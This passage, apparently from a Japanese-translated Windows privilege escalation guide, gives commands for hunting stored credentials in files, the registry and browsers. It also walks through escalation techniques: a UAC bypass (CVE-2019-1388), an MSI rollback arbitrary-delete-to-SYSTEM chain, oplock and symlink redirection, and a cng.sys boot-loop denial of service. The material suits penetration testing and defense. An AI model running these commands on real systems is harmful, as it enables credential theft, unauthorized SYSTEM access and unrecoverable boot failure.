setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索する:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の Credentials

Bin も確認して、その中に credentials がないか探すべきです

複数のプログラムで保存された **passwords を recover** するには、以下を使えます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 内

**credentials を含む可能性がある他の registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**Chrome** または **Firefox** のパスワードが保存されている db を確認してください。\
また、ブラウザの履歴、ブックマーク、favorites も確認し、そこに **passwords are** 保存されていないか見てください。

ブラウザからパスワードを抽出するためのツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows operating system に組み込まれた technology で、異なる言語の software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって **identified via** され、各 component は 1 つ以上の interfaces を公開し、それらは interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下の registry で定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** をマージすることで作成されます。

この registry の CLSIDs 内には子 registry の **InProcServer32** があり、これは **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) にできる **ThreadingModel** という値を含みます。

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

基本的に、実行される **DLLs** のいずれかを **overwrite** できるなら、その DLL が別の user によって実行される場合に **privileges** を **escalate** できます。

攻撃者が persistence mechanism として COM Hijacking をどのように使うかを学ぶには、以下を確認してください:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**ファイル内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインです。私はこのプラグインを作成し、victim 内で credentials を検索するすべての metasploit POST module を**自動的に実行**するようにしました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されている passwords を含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムから password を抽出するためのもう1つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、平文でこのデータを保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

SYSTEMとして実行中のプロセスが新しいプロセスを **OpenProcess()** で **full access** 付きで開くとします。  
同じプロセスがさらに、**low privileges** の新しいプロセスを **CreateProcess()** で作成しますが、**メインプロセスのすべての open handles を継承**します。\
その後、**low privileged process に full access** できるなら、**OpenProcess()** で作成された特権プロセスへの **open handle** を取得して `shellcode` を **inject** できます。\
[この脆弱性の **検出方法と exploit 方法** の詳細は、この例を読んでください。](leaked-handle-exploitation.md)\
[**異なる権限レベルで継承された process と thread のより多くの open handlers（full access だけではない）を test して abuse する方法** についての、より完全な説明はこの別の投稿を読んでください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントは、プロセス間通信とデータ転送を可能にします。

Windows は **Named Pipes** という機能を提供しており、無関係なプロセス同士でも、異なるネットワーク越しでもデータを共有できます。これは client/server アーキテクチャに似ており、役割は **named pipe server** と **named pipe client** です。

**client** が pipe 経由でデータを送ると、その pipe を用意した **server** は、必要な **SeImpersonate** 権限があれば、**client の identity を引き継ぐ** ことができます。pipe 経由で通信する **特権プロセス** を特定し、それを模倣できれば、あなたが作成した pipe と相互作用したときにそのプロセスの identity を採用して、**より高い権限を取得** する機会になります。そのような attack の実行手順については、役立つガイドが [**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) にあります。

また、以下のツールを使うと、**burp のようなツールで named pipe communication を intercept** できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールはすべての pipes を列挙して確認し、privescs を見つけることもできます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

server mode の Telephony service (TapiSrv) は `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済み client は、mailslot ベースの async event path を悪用して `ClientAttach` を任意の **4-byte write** に変え、`NETWORK SERVICE` が書き込み可能な既存の任意ファイルへ書き込みを行い、その後 Telephony admin rights を取得して、service として任意の DLL を load できます。全体の流れは以下のとおりです。

- `pszDomainUser` を書き込み可能な既存パスに設定して `ClientAttach` を実行 → service はそれを `CreateFileW(..., OPEN_EXISTING)` で開き、async event writes に使用する
- 各 event は `Initialize` の attacker-controlled `InitContext` をその handle に書き込む。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーし、`GetAsyncEvents` (`Req_Func 0`) で取得し、その後 unregister/shutdown して deterministic writes を繰り返す
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加し、再接続してから、任意の DLL path を指定して `GetUIDllName` を呼び出し、`TSPI_providerUIIdentify` を `NETWORK SERVICE` として実行する

詳細はこちら:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

ページ **[https://filesec.io/](https://filesec.io/)** を確認してください

### Protocol handler / ShellExecute abuse via Markdown renderers

クリック可能な Markdown links が `ShellExecuteExW` に渡されると、危険な URI handlers (`file:`, `ms-appinstaller:`、または登録済みの任意の scheme) をトリガーして、攻撃者が制御するファイルを現在の user として実行できる場合があります。詳細は以下を参照してください:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user として shell を取得したとき、credentials を command line で渡す scheduled tasks や他の process が実行されている場合があります。以下の script は process command lines を 2 秒ごとに取得し、現在の状態を前回の状態と比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから terminal や "NT\AUTHORITY SYSTEM" のような他の process を実行することが可能です。

これにより、同じ脆弱性を使って privilege escalation と UAC bypass を同時に行うことができます。さらに、何かを install する必要はなく、処理中に使用される binary は Microsoft によって署名され、発行されています。

影響を受けるシステムの一部は以下のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を exploit するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass へ

Integrity Levels について学ぶには、こちらを読んでください:

{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypass について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

この手法は、[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、exploit code は [**こちらで利用可能**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) です。

この attack は基本的に、Windows Installer の rollback 機能を悪用して、uninstallation process 中に正規ファイルを malicious なものに置き換えるものです。これを行うために attacker は、`C:\Config.Msi` フォルダを hijack するために使われる **malicious MSI installer** を作成する必要があります。その後、Windows Installer は他の MSI packages の uninstallation 時に rollback files を保存するためにこのフォルダを使い、そこにある rollback files が malicious payload を含むように改変されます。

要約すると、technique は以下のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空にしておく)**

- Step 1: MSI を install する
- 書き込み可能なフォルダ (`TARGETDIR`) に無害な file（例: `dummy.txt`）を install する `.msi` を作成する。
- installer を **"UAC Compliant"** としてマークし、**non-admin user** が実行できるようにする。
- install 後、その file への **handle** を開いたままにしておく。

- Step 2: Uninstall を開始する
- 同じ `.msi` を uninstall する。
- uninstall process は file を `C:\Config.Msi` に移動し、`.rbf` file（rollback backups）へ rename し始める。
- **GetFinalPathNameByHandle** を使って open している file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったタイミングを検出する。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれている。
- これは、`.rbf` が書き込まれたら signal し、
- その後、uninstall を続ける前に別の event を **wait** する。

- Step 4: `.rbf` の削除を block する
- signal されたら、`FILE_SHARE_DELETE` なしで `.rbf` file を **open** する。これにより、その file は **削除できなくなる**。
- その後、uninstall を完了させるために **signal back** する。
- Windows Installer は `.rbf` を delete できず、全内容を delete できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: `.rbf` を手動で delete する
- attacker が `.rbf` file を手動で delete する。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整う。

> この時点で、**SYSTEM-level の arbitrary folder delete vulnerability** を trigger して `C:\Config.Msi` を delete する。

2. **Stage 2 – Rollback Scripts を malicious なものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
- `C:\Config.Msi` folder を自分で再作成する。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` 付きの handle を open したままにしておく。

- Step 7: 別の install を実行する
- `.msi` を再度 install する。以下を指定する:
- `TARGETDIR`: 書き込み可能な location。
- `ERROROUT`: 強制失敗を trigger する variable。
- この install は rollback を再度 trigger するために使われ、`.rbs` と `.rbf` を読み込む。

- Step 8: `.rbs` を監視する
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待つ。
- その filename を取得する。

- Step 9: Rollback 前に同期する
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれている。
- これは、`.rbs` が作成されたタイミングで event を signal し、
- その後、続行前に **wait** する。

- Step 10: 弱い ACL を再適用する
- `.rbs created` event を受け取った後:
- Windows Installer は `C:\Config.Msi` に strong ACLs を再適用する。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているので、**weak ACLs を再度適用できる**。

> ACLs は **handle open 時にのみ enforced** されるため、folder への write はまだ可能です。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
- `.rbs` file を上書きして、Windows に次を指示する **fake rollback script** にする:
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore する。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置する。

- Step 12: Rollback を trigger する
- sync event を signal して installer を再開させる。
- **type 19 custom action (`ErrorOut`)** が、既知の point で install を **意図的に失敗** させるように設定されている。
- これにより **rollback が開始** される。

- Step 13: SYSTEM があなたの DLL を install する
- Windows Installer は:
- malicious な `.rbs` を読み込み、
- `.rbf` DLL を target location に copy する。
- これで、**SYSTEM-loaded path** に malicious DLL が配置される。

- 最終 Step: SYSTEM code を実行する
- hijack した DLL を読み込む trusted な **auto-elevated binary**（例: `osk.exe`）を実行する。
- **Boom**: あなたの code が **SYSTEM として** 実行される。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

main の MSI rollback technique（前述のもの）は、**フォルダ全体**（例: `C:\Config.Msi`）を delete できることを前提としています。では、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals** を exploit できます。すべての folder には、次の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの **index metadata** を保存します。

そのため、フォルダの **`::$INDEX_ALLOCATION` stream** を **delete** すると、NTFS はそのフォルダ全体を filesystem から **remove** します。

これは、次のような標準の file deletion APIs を使って行えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出していても、それは **フォルダ自体を削除** します。

### From Folder Contents Delete to SYSTEM EoP
もしあなたの primitive が任意のファイル/フォルダを削除することを許さないが、攻撃者が制御するフォルダの **内容の削除** は許す場合はどうなるか？

1. Step 1: bait folder and file を用意する
- Create: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を置く
- oplock は、特権プロセスが `file1.txt` を削除しようとしたときに **実行を一時停止** する。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御があなたの callback に渡ります。

4. Step 4: oplock callback 内で – 削除をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊さずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください — そうすると oplock が早すぎるタイミングで解除されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これは、フォルダのメタデータを保存する NTFS の内部ストリームを対象にしています — これを削除するとフォルダも削除されます。

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意フォルダ作成から永続的DoSへ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダを作成**できるプリミティブを悪用します。

**ファイル**ではなく**フォルダ**を、**重要な Windows driver** の名前で作成します。たとえば:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` カーネルモードドライバに対応します。
- これを**事前にフォルダとして作成**すると、Windows は起動時に実際のドライバをロードできなくなります。
- その後、Windows は起動中に `cng.sys` のロードを試みます。
- フォルダを検出し、**実際のドライバを解決できず**、**クラッシュするか起動を停止**します。
- **フォールバックはなく**、外部介入（例: boot repair やディスクアクセス）なしでは**回復できません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイル上書き / boot DoS へ

**特権サービス**が、**書き込み可能な config** から読み取ったパスにログ/エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスをリダイレクトし、特権書き込みを任意の上書きに変えられます（**SeCreateSymbolicLinkPrivilege** がなくても可能）。

**要件**
- 対象パスを保存する config が攻撃者により書き込み可能（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスへ書き込む特権操作があること（log, export, report）。

**例のチェーン**
1. config を読み、特権ログ保存先を取得する。例: `C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` が `C:\ProgramData\ICONICS\IcoSetup64.ini` の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` にある。
2. admin なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: admin が "send test SMS" を実行する）。この書き込みは `C:\Windows\System32\cng.sys` に入る。
4. 上書きされた対象を確認する（hex/PE parser）して破損を検証する。再起動すると Windows は改ざんされた driver path を読み込もうとする → **boot loop DoS**。これは、特権サービスが書き込みのために開く任意の保護されたファイルにも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` に copy が存在するとそれが先に試される可能性があり、破損データの reliable DoS sink になる。



## **From High Integrity to System**

### **New service**

すでに High Integrity process 上で動作しているなら、**SYSTEM への path** は、新しい service を**作成して実行する**だけで簡単な場合がある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス binary を作成する際は、それが有効な service であること、または binary が必要な処理を十分速く実行することを確認してください。そうでない場合、20s で kill されます。

### AlwaysInstallElevated

High Integrity process から **AlwaysInstallElevated registry entries を有効化**し、_**.msi**_ wrapper を使って reverse shell を **install** することを試せます。\
[関連する registry keys と _.msi_ package の install 方法の詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちら**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（たいていは既に High Integrity process の中で見つかります）、SeDebug privilege で **ほぼ任意の process**（protected processes ではないもの）を **open** でき、process の **token を copy** して、その token で **任意の process を作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM 実行中の任意の process** が選ばれます（_そう、SYSTEM process でもすべての token privileges を持たないものがあります_）。\
**この technique を実行する code の** [**example はここ**](sedebug-+-seimpersonate-copy-token.md)**にあります。**

### **Named Pipes**

この technique は meterpreter の `getsystem` で権限昇格するために使われます。この technique は、**pipe を作成し、その pipe に書き込むための service を作成・悪用する**ことから成ります。すると、**`SeImpersonate`** privilege を使って pipe を作成した **server** は、pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について [**もっと学びたいならこれを読んでください**](#named-pipe-client-impersonation)。\
high integrity から System へ name pipes を使って移行する例を読みたいなら、[**これを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**読み込まれる** **SYSTEM** 実行中の **process** が使用する dll を **hijack** できれば、その権限で任意の code を実行できます。したがって Dll Hijacking もこの種の privilege escalation に有用であり、さらに **high integrity process からはるかに達成しやすい**です。なぜなら、その process は dll を読み込むために使われる folder への **write permissions** を持つからです。\
**Dll hijacking についてもっと学ぶには** [**こちら**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を調べる最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files をチェック（[**ここを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations をチェックし、情報を収集（[**ここを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、および RDP の保存済み session 情報を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から crendentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した password を domain 全体に spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell の ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（DEPRECATED for Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使って compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を enumeration します（privesc というより情報収集 tool です）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くの software から credentials を抽出します（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# 移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェック（github に precompiled executable あり）。推奨されません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations をチェック（python から exe を生成）。推奨されません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を基に作成された tool です（正しく動作するのに accesschk は不要ですが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使って project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次を実行できます:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
